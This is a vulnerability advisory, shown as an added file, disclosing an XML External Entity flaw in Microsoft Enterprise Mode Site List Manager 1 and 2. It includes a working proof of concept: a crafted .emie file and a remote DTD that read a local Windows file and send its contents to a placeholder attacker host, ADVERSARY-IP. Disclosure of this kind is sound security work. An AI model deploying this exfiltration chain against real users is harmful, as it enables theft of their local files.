@@ -1,0 +1,92 @@
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/MICROSOFT-WINDOWS-ENTERPRISE-MODE-SITE-LIST-MANAGER-XXE.txt
+[+] ISR: Apparition Security          
+ 
+
+***Greetz: indoushka | Eduardo***  
+
+
+Vendor
+=============
+www.microsoft
+
+
+Product
+===========
+Enterprise Mode Site List Manager
+versions(1/2)
+
+
+You can use IE11 and the Enterprise Mode Site List Manager to add individual website domains and domain paths
+and to specify whether the site renders using Enterprise Mode or the default mode.
+
+
+
+Vulnerability Type
+===================
+XML External Entity Injection
+
+
+
+CVE Reference
+==============
+N/A
+
+
+Security Issue
+================
+Versions 1 and 2 of Microsoft Enterprise Mode Site List Manager allow local file exfiltration to a remote attacker controlled server, if the user is tricked
+into using an attacker supplied ".emie" site list manager file type.
+
+
+
+Exploit/POC
+=============
+1) python -m SimpleHTTPServer
+
+
+
+2) POC.emie
+
+<?xml version="1.0"?>  
+<!DOCTYPE roottag [ 
+<!ENTITY % file SYSTEM "c:\Windows\msdfmap.ini">
+<!ENTITY % dtd SYSTEM "http://ADVERSARY-IP:8000/payload.dtd">
+%dtd;]>
+<pwn>&send;</pwn>
+
+
+3) payload.dtd
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://ADVERSARY-IP:8000?%file;'>">
+%all;
+
+
+Import the POC.emie into Enterprise Mode Site List Manager, then remote attackers will recieve local user files... nice.
+
+
+Network Access
+===============
+Remote
+
+
+
+
+Severity
+=========
+High
+
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
